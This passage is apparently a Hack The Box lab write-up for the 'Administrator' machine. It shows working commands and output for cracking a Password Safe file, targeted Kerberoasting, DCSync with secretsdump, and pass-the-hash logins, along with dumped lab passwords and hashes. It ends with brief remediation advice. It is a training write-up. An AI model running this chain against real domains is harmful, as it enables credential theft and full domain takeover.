        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to administrator.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                            
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ smbclient \\\\administrator.htb\\NETLOGON -U benjamin%zero123
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct  4 21:48:08 2024
  ..                                  D        0  Fri Oct  4 21:54:15 2024

                5606911 blocks of size 4096. 2009697 blocks available
smb: \> 
```

I don't see nothing on the smb...
Maybe on the ftp?
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ ftp administrator.htb                                            
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:oriol): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||61289|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> 
```

Yes! Seems that there is like a dump of a password manager?
Searching a little bit, this file is from the **pwsafe** software
- https://pwsafe.org/

We need a master password. I find this hashcat thread with the necessary information to crack the password.
- https://hashcat.net/forum/thread-3883.html

```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ hashcat -m 5200 Backup.psafe3  /usr/share/wordlists/rockyou.txt.gz 

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 9 9900X 12-Core Processor, 11465/22995 MB (4096 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

ATTENTION! Potfile storage is disabled for this hash mode.
Passwords cracked during this session will NOT be stored to the potfile.
Consider using -o to save cracked passwords.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

Backup.psafe3:tekieromucho                                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Sun Apr  6 20:13:43 2025 (1 sec)
Time.Estimated...: Sun Apr  6 20:13:44 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   156.7 kH/s (8.10ms) @ Accel:1024 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12288/14344385 (0.09%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hawkeye
Hardware.Mon.#1..: Util:  9%

Started: Sun Apr  6 20:13:34 2025
Stopped: Sun Apr  6 20:13:45 2025
```

**Password:** tekieromucho

Now, I can access to the password manager, and I see that there are 3 users:
- **alexander:** UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
- **emily:** UXLCI5iETUsIBoFVTj8yQFKoHjXmb
- **emma:** WwANQWnmJnGV07WQN8bMS7FMAbjNur

I try and access with the emily user:
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ evil-winrm -i administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> ls
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily> ls


    Directory: C:\Users\emily


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/30/2024   2:23 PM                3D Objects
d-r---        10/30/2024   2:23 PM                Contacts
d-r---        10/30/2024   5:17 PM                Desktop
d-r---        10/30/2024   2:23 PM                Documents
d-r---        10/30/2024   2:23 PM                Downloads
d-r---        10/30/2024   2:23 PM                Favorites
d-r---        10/30/2024   2:23 PM                Links
d-r---        10/30/2024   2:23 PM                Music
d-r---        10/30/2024   2:23 PM                Pictures
d-r---        10/30/2024   2:23 PM                Saved Games
d-r---        10/30/2024   2:23 PM                Searches
d-r---        10/30/2024   2:23 PM                Videos


*Evil-WinRM* PS C:\Users\emily> cd Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
```

### Privilege escalation
```
*Evil-WinRM* PS C:\Users\emily\Desktop> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ============================================
administrator\emily S-1-5-21-1088858960-373806567-254189436-1112


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled
```

I don't see any privileges that could help escalate.

Returning to Bloodhound, I see that Emily has `GenericWrite` privileges on the user Ethan.
![[administrator03.png]]

And I also see that Ethan has `DCSync` privileges on the whole AD.
![[administrator04.png]]

DCSync is a feature used to replicate changes between DC. We need the `DS-Replication-Get-Changes` and the `DS-Replication-Get-Changes-All` permissions, which Ethan has. With those privileges, we can request sensitive information like password hashes.

I think it's pretty clear what I have to do.

I will do a **kerberoast** attack on the user Ethan. First, let's learn how the attack works:
First a **SPN** or Service Principal Name is an unique name assigned to a service instance and assigned to an account. 
- I create a SPN with the Ethan account, with the `GenericWrite` permissions. Now Ethan is like a "service", meaning we can request a TGS (Ticket Granting Service) ticket with the Ethan user.
- We query the AD for Ethan's SPN, and if it exists, we also request a TGS (Ticket Granting Service) for the Ethan service
- That TGS is encrypted with Ethan's password hash.
- We have the Ethan  password hash!

I will use `targetedKerberoast.py` , which automates all this process, to do the attack.
Not before syncing my local machine time with the DC.
```
┌──(oriol㉿zero)-[~/htb/administrator/targetedKerberoast]
└─$ sudo ntpdate administrator.htb
[sudo] password for oriol: 
2025-04-07 05:06:18.503817 (+0200) +25202.238424 +/- 0.021050 administrator.htb 10.10.11.42 s1 no-leap
CLOCK: time stepped by 25202.238424
                                                                                                                                                                                                                                            
┌──(oriol㉿zero)-[~/htb/administrator/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.10.11.42
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b5c2d39c9b152d39931f19ccfcb156a1$a9ae9078580a20e7207cb51308586a2f0aa233a88b83f5c243768ac66461e6c657266dd0e1f7eda397da921af0cf51dcc954f3bbfbba028e407c5ee6321072a08925a69cb4e3555cefcebd12c26e82718cccc30ec8ad3b0313c7bc56601c6340156e8d191248304583e802fba1f9d158a13768fdeac9e1f0982a42f7e386331678140656712e7cfa6743c247b4c26267846f588e4c03069f62076197c3337fade567a9b6b6db51296d9fc41e459e2b2cd6fb50a4ed79a9a56ba694f08ca62f6a5c46b99c8f397c7566cf5ea3cc41cad82b0a9cb2e7fa999ea22a099059656f84271bd2f1472194af3392813c0b9f6ff0a92094b2beb8e4175b30ce6b52b26b68e03aed8354460e9d11d8ffdd649e345dc360e63759152c6f3f6f5cb5d555930058769e9998549af41e0c27b5bb4b02ad192786ef00d71df5d033f11fae66e79714e32f0faf0accb201a58c7fc150c7674edbd7b3fba75ee3d683df6dfe62d9f257646cca157ed1a3b8b7f76b96490dae90990f8e58e6c5a3ede720b479d23fde67d0d3a144338f26ee1cbb38cbdef05fb57733c52b4f83b4cdf490c2f8b37d25a8e53bc01a92f353d91da9f1f670a9e48ca2076d056e58d7d99688132d3eb2e9ae312f169a19320c28772098e6df6332290f55a1c7c11684c273517f14bb801e38b46a0ffc1a1c82403711be65fbc2a58a8a75a154e6f13ef7b386ac083dfd73e0bdff68df193064a74afde09f51bcb1abeb94bfb93c1b66e227aae80cc0b055027e4d6feb93aa5d41df2a395ca8284bef8db96bfd6da9899e8bcc3871002ca5e4ec5c55b993ca8c6cf446e5eb019249c8a5c7371a0e818b73592e23e06921bc4ca7f553481f9d246e6da3f44ce722ea9092eac894eca234ac019347dfd063aae61357516738e65b328060ca9ec8f273f063f1b8a7241678fa7e5b76e36c6531401e767bbc6016d92438b2f91bcaa79d762d84c743ca61c647314b44e980366b46685fbb91883aa079846200a6c449cde5b3f07ae660061ac10eb0444289ccdfb5e915dc7c09f493450e0a707f379fc2a82c671aac953347033b015f5f745fb7125e69b81c31f3cebe8659142623609dd768d0529083a544d10ba07dcd51161f48ddad4453afa6ec09bd3a69b4f2abd273edc17b8ed04b83a6f60dd21689680d476ce9ab3e4fe3120fe24baf489b5270d6f69c87e17206289e1099e3d481fd0066f3842d2fad6522318bb7e3aecd6724950a79dbdcbdaf8e19887080a7ed906a40821ad29c9967612dddf599ab6cdfea4756cd39199829c6442220c7d50b68bc001b1aea36af9e138ea3a2832e08465f76d7962cd1730094b83e71af0d6114cf3f4b9c70a762d515cc3ae11fc5e829359a6352aa148d583981077364e34d7ca37e94ae3b890bbe266ca827672d08b49cd20c92ffc592da63277796c21b1817117a64ffd0c9e293669cd604b534f2353ac55ffb5acd3ef93b10a8a23f5b3c55d49f60c5d7a0d1b9ddb0be45d9d65790b95abacd7fe145bfc6cb2c2b596ffc57
[VERBOSE] SPN removed successfully for (ethan)
```

Now it's time to crack the hash with `hashcat`
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ hashcat -m 13100 ethan_hash.txt /usr/share/wordlists/rockyou.txt.gz 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 9 9900X 12-Core Processor, 11465/22995 MB (4096 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b5c2d39c9b152d39931f19ccfcb156a1$a9ae9078580a20e7207cb51308586a2f0aa233a88b83f5c243768ac66461e6c657266dd0e1f7eda397da921af0cf51dcc954f3bbfbba028e407c5ee6321072a08925a69cb4e3555cefcebd12c26e82718cccc30ec8ad3b0313c7bc56601c6340156e8d191248304583e802fba1f9d158a13768fdeac9e1f0982a42f7e386331678140656712e7cfa6743c247b4c26267846f588e4c03069f62076197c3337fade567a9b6b6db51296d9fc41e459e2b2cd6fb50a4ed79a9a56ba694f08ca62f6a5c46b99c8f397c7566cf5ea3cc41cad82b0a9cb2e7fa999ea22a099059656f84271bd2f1472194af3392813c0b9f6ff0a92094b2beb8e4175b30ce6b52b26b68e03aed8354460e9d11d8ffdd649e345dc360e63759152c6f3f6f5cb5d555930058769e9998549af41e0c27b5bb4b02ad192786ef00d71df5d033f11fae66e79714e32f0faf0accb201a58c7fc150c7674edbd7b3fba75ee3d683df6dfe62d9f257646cca157ed1a3b8b7f76b96490dae90990f8e58e6c5a3ede720b479d23fde67d0d3a144338f26ee1cbb38cbdef05fb57733c52b4f83b4cdf490c2f8b37d25a8e53bc01a92f353d91da9f1f670a9e48ca2076d056e58d7d99688132d3eb2e9ae312f169a19320c28772098e6df6332290f55a1c7c11684c273517f14bb801e38b46a0ffc1a1c82403711be65fbc2a58a8a75a154e6f13ef7b386ac083dfd73e0bdff68df193064a74afde09f51bcb1abeb94bfb93c1b66e227aae80cc0b055027e4d6feb93aa5d41df2a395ca8284bef8db96bfd6da9899e8bcc3871002ca5e4ec5c55b993ca8c6cf446e5eb019249c8a5c7371a0e818b73592e23e06921bc4ca7f553481f9d246e6da3f44ce722ea9092eac894eca234ac019347dfd063aae61357516738e65b328060ca9ec8f273f063f1b8a7241678fa7e5b76e36c6531401e767bbc6016d92438b2f91bcaa79d762d84c743ca61c647314b44e980366b46685fbb91883aa079846200a6c449cde5b3f07ae660061ac10eb0444289ccdfb5e915dc7c09f493450e0a707f379fc2a82c671aac953347033b015f5f745fb7125e69b81c31f3cebe8659142623609dd768d0529083a544d10ba07dcd51161f48ddad4453afa6ec09bd3a69b4f2abd273edc17b8ed04b83a6f60dd21689680d476ce9ab3e4fe3120fe24baf489b5270d6f69c87e17206289e1099e3d481fd0066f3842d2fad6522318bb7e3aecd6724950a79dbdcbdaf8e19887080a7ed906a40821ad29c9967612dddf599ab6cdfea4756cd39199829c6442220c7d50b68bc001b1aea36af9e138ea3a2832e08465f76d7962cd1730094b83e71af0d6114cf3f4b9c70a762d515cc3ae11fc5e829359a6352aa148d583981077364e34d7ca37e94ae3b890bbe266ca827672d08b49cd20c92ffc592da63277796c21b1817117a64ffd0c9e293669cd604b534f2353ac55ffb5acd3ef93b10a8a23f5b3c55d49f60c5d7a0d1b9ddb0be45d9d65790b95abacd7fe145bfc6cb2c2b596ffc57:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....6ffc57
Time.Started.....: Sun Apr  6 22:12:38 2025 (0 secs)
Time.Estimated...: Sun Apr  6 22:12:38 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5556.9 kH/s (1.14ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12288/14344385 (0.09%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hawkeye
Hardware.Mon.#1..: Util:  8%

Started: Sun Apr  6 22:12:29 2025
Stopped: Sun Apr  6 22:12:40 2025
```

Password found: **limpbizkit**
I searched for the RC4 hash to know which type use on hashcat.
- https://activedirectory.mrw0l05zyn.cl/escalamiento-de-privilegios-de-dominio/kerberoast

And now, it's time to abuse the DCSync, I wil be using `secretsdump.py` which automates the requests of the users hashes.
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'DC.ADMINISTRATOR.HTB'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:5d789611b4d6b924fffb5f73e1fd24e3:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:5d789611b4d6b924fffb5f73e1fd24e3:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:9a1ce6a4cb48f61749cdcc1c4375f099e884ff070e04616ec223169eb66aa197
administrator.htb\michael:aes128-cts-hmac-sha1-96:e88be50f5a52bd9c2729eee1bc1ecfe7
administrator.htb\michael:des-cbc-md5:433db3b54fbcb9ae
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:b21c23cff5a28aa98d612ea4aff1ba6a622d185f4229025d9fdb68da5a4c9ba0
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:9404622c1df558f7868e795f1b484878
administrator.htb\benjamin:des-cbc-md5:852ff8f840d004b0
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

And we got the Administrator hash, now it's only question to use evil-winrm with pass-the-hash option enabled to remote to the computer and get the root flag.
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
```

# Solutions
- Remove all unnecessary user privileges, why are so many users with privileges over other users? And also Ethan with DCSync privileges?
- Use more long and secure passwords.

# Links used
- https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-start-page
- https://docs.tenable.com/identity-exposure/SaaS/Content/User/AttackPath/DCSync.htm
- https://www.semperis.com/es/blog/dcsync-attack/
- https://www.tarlogic.com/es/glosario-ciberseguridad/kerberoasting/
- https://serverfault.com/questions/707866/list-all-kerberized-spns-in-linux
- https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=AllowLogOnLocally
- https://takraw-s.medium.com/fix-errors-socket-ssl-wrapping-error-errno-104-connection-reset-by-peer-9c63c551cd7
- https://github.com/ShutdownRepo/targetedKerberoast
- https://activedirectory.mrw0l05zyn.cl/escalamiento-de-privilegios-de-dominio/kerberoast
- https://www.secura.com/blog/kerberoasting-exploiting-kerberos-to-compromise-microsoft-active-directory
- https://hashcat.net
- https://pwsafe.org/
- https://learn.microsoft.com/es-es/sql/reporting-services/report-server/register-a-service-principal-name-spn-for-a-report-server?view=sql-server-ver16
